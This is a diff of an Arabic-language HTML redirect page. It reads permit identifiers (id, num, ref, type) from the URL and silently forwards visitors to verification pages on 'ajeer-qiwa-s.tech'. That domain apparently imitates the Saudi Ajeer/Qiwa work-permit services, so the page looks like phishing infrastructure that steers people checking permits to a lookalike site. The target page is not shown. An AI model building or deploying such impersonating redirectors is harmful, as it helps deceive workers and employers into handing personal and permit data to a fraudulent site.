@@ -1,52 +1,48 @@
-
 <!DOCTYPE html>
-<html lang="en">
+<html lang="ar" dir="rtl">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Redirecting...</title>
-    <script>
-        const params = new URLSearchParams(window.location.search);
-
-        let id = params.get("id");
-        const num = params.get("num");
-        const ref = params.get("ref");
-        const type = params.get("type");
-
-        if (!id) {
-            const segments = window.location.pathname
-                .split("/")
-                .filter(Boolean);
-
-            const last = segments[segments.length - 1];
-
-            if (last && last !== "view" && last !== "index.html") {
-                id = last;
-            }
-        }
-
-        if (id) {
-            const target = new URL(
-                "https://ajeer-qiwa-s.tech/ajeer/verify.html"
-            );
-
-            target.searchParams.set("id", id);
-
-            if (num) target.searchParams.set("num", num);
-            if (ref) target.searchParams.set("ref", ref);
-            if (type) target.searchParams.set("type", type);
-
-            window.location.replace(target.toString());
-        } else {
-            document.addEventListener("DOMContentLoaded", () => {
-                document.body.innerHTML =
-                    "<h2>Invalid request</h2><p>Missing ID.</p>";
-            });
-        }
-    </script>
+    <title>جاري تحويلك...</title>
 </head>
 <body>
-    Redirecting...
+<script>
+(function () {
+    const params = new URLSearchParams(window.location.search);
+
+    let id = params.get("id");
+    const num = params.get("num");
+    const ref = params.get("ref");
+    const type = params.get("type");
+
+    if (!id) {
+        const parts = window.location.pathname.split("/").filter(Boolean);
+        const last = parts[parts.length - 1];
+
+        if (last && last !== "index.html" && last !== "view") {
+            id = last;
+        }
+    }
+
+    if (!id) {
+        document.body.innerHTML = "<h2>طلب غير صالح: رقم التصريح مفقود</h2>";
+        return;
+    }
+
+    const page = type === "add" ? "add-verify.html" : "verify.html";
+
+    const target = new URL(
+        "https://ajeer-qiwa-s.tech/ajeer/" + page
+    );
+
+    target.searchParams.set("id", id);
+
+    if (num) target.searchParams.set("num", num);
+    if (ref) target.searchParams.set("ref", ref);
+    if (type) target.searchParams.set("type", type);
+
+    window.location.replace(target.toString());
+})();
+</script>
 </body>
 </html>
-
